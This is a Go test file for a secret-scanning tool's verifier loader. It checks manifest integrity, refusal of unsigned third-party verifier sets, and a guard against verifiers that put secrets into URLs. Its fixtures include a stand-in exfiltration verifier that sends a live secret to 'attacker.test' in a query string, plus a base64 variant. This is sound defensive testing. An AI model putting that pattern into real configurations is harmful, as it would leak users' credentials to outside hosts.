package verify

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// writeFile writes a file under dir (creating parents) and fails the test on error.
func writeFile(t *testing.T, dir, name, body string) string {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

// headerVerifier is a well-formed, non-exfil verifier (secret in an Authorization header).
const headerVerifier = `id: hv
match: [hv, hv_]
requests:
  - method: GET
    url: https://api.example.com/user
    headers:
      Authorization: "token {{secret}}"
    matchers:
      - type: status
        status: [200]
`

// urlExfilVerifier embeds the live secret in the URL query — the exfil pattern.
const urlExfilVerifier = `id: exfil
match: [exfil, ex_]
requests:
  - method: GET
    url: https://attacker.test/?k={{secret}}
    matchers:
      - type: status
        status: [200]
`

// TestManifestRoundTripLoads is the happy path: a generated manifest blesses a dir, and a bundled
// load of that dir verifies clean.
func TestManifestRoundTripLoads(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "hv.yaml", headerVerifier)
	if n, err := GenerateManifest(dir); err != nil || n != 1 {
		t.Fatalf("GenerateManifest: n=%d err=%v", n, err)
	}
	set, err := Load(0, dir)
	if err != nil {
		t.Fatalf("clean signed set should load: %v", err)
	}
	if set.Count() != 1 {
		t.Fatalf("count = %d, want 1", set.Count())
	}
}

// TestTamperedBundledFileRejected is the control-1 regression: after a manifest is generated, editing
// an installed verifier must be caught — the set is refused and nothing from it loads.
func TestTamperedBundledFileRejected(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "hv.yaml", headerVerifier)
	if _, err := GenerateManifest(dir); err != nil {
		t.Fatal(err)
	}
	// Tamper: repoint the verifier at an attacker host (and switch to header so the exfil guard isn't
	// what trips it — we want the integrity check to be the thing that fires).
	writeFile(t, dir, "hv.yaml", strings.Replace(headerVerifier, "api.example.com", "attacker.test", 1))

	set, err := Load(0, dir)
	if err == nil {
		t.Fatal("tampered bundled file must be rejected, got nil error")
	}
	if !strings.Contains(err.Error(), "integrity") || !strings.Contains(err.Error(), "tampered") {
		t.Errorf("error should name the integrity/tamper failure: %v", err)
	}
	if set.Count() != 0 {
		t.Errorf("no verifier from a tampered set should load, got count=%d", set.Count())
	}
}

// TestUnlistedFileRejected: a manifest is authoritative — a verifier present on disk but absent from
// the manifest (e.g. an attacker dropped an extra file next to a signed set) fails the set.
func TestUnlistedFileRejected(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "hv.yaml", headerVerifier)
	if _, err := GenerateManifest(dir); err != nil {
		t.Fatal(err)
	}
	writeFile(t, dir, "rogue.yaml", strings.Replace(headerVerifier, "id: hv", "id: rogue", 1))

	_, err := Load(0, dir)
	if err == nil || !strings.Contains(err.Error(), "not in manifest") {
		t.Fatalf("unlisted file should be refused, got %v", err)
	}
}

// TestMissingFileRejected: a file listed in the manifest but removed from disk fails the set (an
// attacker can't drop a verifier to weaken coverage without it being noticed).
func TestMissingFileRejected(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "hv.yaml", headerVerifier)
	writeFile(t, dir, "second.yaml", strings.Replace(headerVerifier, "id: hv", "id: second", 1))
	if _, err := GenerateManifest(dir); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(filepath.Join(dir, "second.yaml")); err != nil {
		t.Fatal(err)
	}
	_, err := Load(0, dir)
	if err == nil || !strings.Contains(err.Error(), "missing") {
		t.Fatalf("missing listed file should be refused, got %v", err)
	}
}

// TestUnsignedRemoteRefused is the control-2 regression: an untrusted remote set with NO manifest is
// refused by default, and loads only with explicit --allow-unsigned.
func TestUnsignedRemoteRefused(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "hv.yaml", headerVerifier) // no GenerateManifest -> unsigned

	_, err := LoadWithPolicy(0, LoadPolicy{Trust: TrustUntrusted}, dir)
	if err == nil {
		t.Fatal("unsigned remote set must be refused without --allow-unsigned")
	}
	if !strings.Contains(err.Error(), ManifestName) || !strings.Contains(err.Error(), "allow-unsigned") {
		t.Errorf("refusal should mention the missing manifest and the opt-in: %v", err)
	}

	set, err := LoadWithPolicy(0, LoadPolicy{Trust: TrustUntrusted, AllowUnsigned: true}, dir)
	if err != nil {
		t.Fatalf("--allow-unsigned should let the unsigned set load: %v", err)
	}
	if set.Count() != 1 {
		t.Errorf("allow-unsigned load count = %d, want 1", set.Count())
	}
}

// TestUntrustedSourceTheaterClosed is the KEY regression for the security-theater fix: an untrusted
// source that ships its OWN, fully-matching manifest (exactly what an attacker produces by running
// `sha256sum > MANIFEST.sha256` over their planted files) is STILL refused without --allow-unsigned. A
// self-shipped manifest authenticates nothing, so it must NOT substitute for the operator's opt-in. With
// --allow-unsigned the same set loads (the operator explicitly accepted the third-party risk).
func TestUntrustedSourceTheaterClosed(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "hv.yaml", headerVerifier)
	if _, err := GenerateManifest(dir); err != nil { // attacker self-signs their own files
		t.Fatal(err)
	}

	_, err := LoadWithPolicy(0, LoadPolicy{Trust: TrustUntrusted}, dir)
	if err == nil {
		t.Fatal("a self-signed untrusted source must be refused without --allow-unsigned (a shipped manifest proves nothing)")
	}
	if !strings.Contains(err.Error(), "allow-unsigned") || !strings.Contains(err.Error(), "cannot be authenticated") {
		t.Errorf("refusal should be honest about why the manifest is no proof and how to opt in: %v", err)
	}

	set, err := LoadWithPolicy(0, LoadPolicy{Trust: TrustUntrusted, AllowUnsigned: true}, dir)
	if err != nil {
		t.Fatalf("--allow-unsigned should load the (self-signed) untrusted set at the operator's risk: %v", err)
	}
	if set.Count() != 1 {
		t.Errorf("count = %d, want 1", set.Count())
	}
}

// TestUrlExfilVerifierFlagged is the control-3 regression: a verifier that interpolates {{secret}}
// into the URL is refused in an UNSIGNED set (the exfil vector a malicious set ships), and loads only
// with --allow-unsigned. A signed BUNDLED set's URL-secret placement was vetted against the binary
// anchor, so it only warns (covered by TestSignedBundledUrlExfilWarns / TestBundledUrlSecretWarnsNotRefused).
func TestUrlExfilVerifierFlagged(t *testing.T) {
	if !urlInterpolatesSecret("https://attacker.test/?k={{secret}}") {
		t.Fatal("urlInterpolatesSecret must detect a {{secret}} query")
	}
	if !urlInterpolatesSecret("https://attacker.test/{{base64(secret)}}") {
		t.Fatal("urlInterpolatesSecret must detect base64(secret) in the URL")
	}
	if urlInterpolatesSecret("https://api.example.com/user") {
		t.Fatal("a secret-free URL must not be flagged")
	}

	// Unsigned set (no manifest) with an exfiltrating verifier: the whole set is first refused for
	// being unsigned; allow-unsigned gets past that, and then the exfil guard is downgraded to a
	// warning so the verifier loads (the operator explicitly opted in).
	dir := t.TempDir()
	writeFile(t, dir, "exfil.yaml", urlExfilVerifier)

	_, err := LoadWithPolicy(0, LoadPolicy{Trust: TrustUntrusted}, dir)
	if err == nil {
		t.Fatal("unsigned exfil set must be refused")
	}

	set, err := LoadWithPolicy(0, LoadPolicy{Trust: TrustUntrusted, AllowUnsigned: true}, dir)
	if err != nil {
		t.Fatalf("--allow-unsigned should load the exfil verifier (with a warning): %v", err)
	}
	if set.Count() != 1 {
		t.Errorf("count = %d, want 1", set.Count())
	}

	// A BUNDLED (default-policy) unsigned dir is permitted to load by the integrity gate, but the
	// exfil guard still REFUSES the secret-in-URL verifier in it — defense in depth even for the local
	// trusted-by-path case, because an unsigned local dir could have been planted.
	bundled := t.TempDir()
	writeFile(t, bundled, "exfil.yaml", urlExfilVerifier)
	set, err = Load(0, bundled) // bundled trust, no manifest -> unsigned
	if err == nil || !strings.Contains(err.Error(), "exfil") {
		t.Fatalf("unsigned bundled exfil verifier should be refused by the exfil guard, got %v", err)
	}
	if set.Count() != 0 {
		t.Errorf("exfil verifier must not load, count=%d", set.Count())
	}
}

// TestSignedBundledUrlExfilWarns: once a BUNDLED set is signed (its manifest verifies against the binary
// anchor), even a URL-secret verifier loads with only a warning — the anchored signature means the
// bundled author vetted the placement. This is what lets a vetted Telegram-style verifier ship. (An
// untrusted source gets NO such downgrade from a manifest it ships: TestUntrustedSourceTheaterClosed.)
func TestSignedBundledUrlExfilWarns(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "exfil.yaml", urlExfilVerifier)
	if _, err := GenerateManifest(dir); err != nil {
		t.Fatal(err)
	}
	set, err := LoadWithPolicy(0, LoadPolicy{Trust: TrustBundled}, dir)
	if err != nil {
		t.Fatalf("signed bundled set should load (warn, not refuse): %v", err)
	}
	if set.Count() != 1 {
		t.Errorf("count = %d, want 1", set.Count())
	}
}

// TestBundledUrlSecretWarnsNotRefused: a token-in-path verifier (Telegram-style) in the bundled/
// signed set loads (the placement is vetted) — only a loud warning, never a refusal.
func TestBundledUrlSecretWarnsNotRefused(t *testing.T) {
	dir := t.TempDir()
	tg := `id: tg
match: [tg]
requests:
  - url: https://api.telegram.org/bot{{secret}}/getMe
    matchers:
      - type: word
        words: ['"ok":true']
`
	writeFile(t, dir, "tg.yaml", tg)
	if _, err := GenerateManifest(dir); err != nil {
		t.Fatal(err)
	}
	set, err := Load(0, dir) // bundled trust
	if err != nil {
		t.Fatalf("bundled token-in-path verifier should load: %v", err)
	}
	if set.Count() != 1 {
		t.Errorf("count = %d, want 1", set.Count())
	}
}

// TestCorruptManifestRefused: a malformed manifest must refuse the set, never silently degrade to
// "unsigned" (which would let an attacker neutralize the check by corrupting the manifest).
func TestCorruptManifestRefused(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "hv.yaml", headerVerifier)
	writeFile(t, dir, ManifestName, "this is not a valid manifest line\n")
	_, err := Load(0, dir)
	if err == nil || !strings.Contains(err.Error(), "malformed") {
		t.Fatalf("corrupt manifest should refuse the set, got %v", err)
	}
}

// TestUnsignedBundledDirStillLoads: a hand-authored dir with NO manifest still loads under bundled
// trust (so `--verifiers DIR` of local files keeps working) — the manifest is verify-if-present.
func TestUnsignedBundledDirStillLoads(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "hv.yaml", headerVerifier)
	set, err := Load(0, dir)
	if err != nil {
		t.Fatalf("unsigned bundled dir should still load: %v", err)
	}
	if set.Count() != 1 {
		t.Errorf("count = %d, want 1", set.Count())
	}
}

// TestSingleFilePathLoads: an explicit single-file path (not a dir) has no dir-manifest to check and
// must keep loading as before; the exfil guard still applies but a header verifier is fine.
func TestSingleFilePathLoads(t *testing.T) {
	dir := t.TempDir()
	p := writeFile(t, dir, "hv.yaml", headerVerifier)
	set, err := Load(0, p)
	if err != nil {
		t.Fatalf("single-file load should work: %v", err)
	}
	if set.Count() != 1 {
		t.Errorf("count = %d, want 1", set.Count())
	}
}
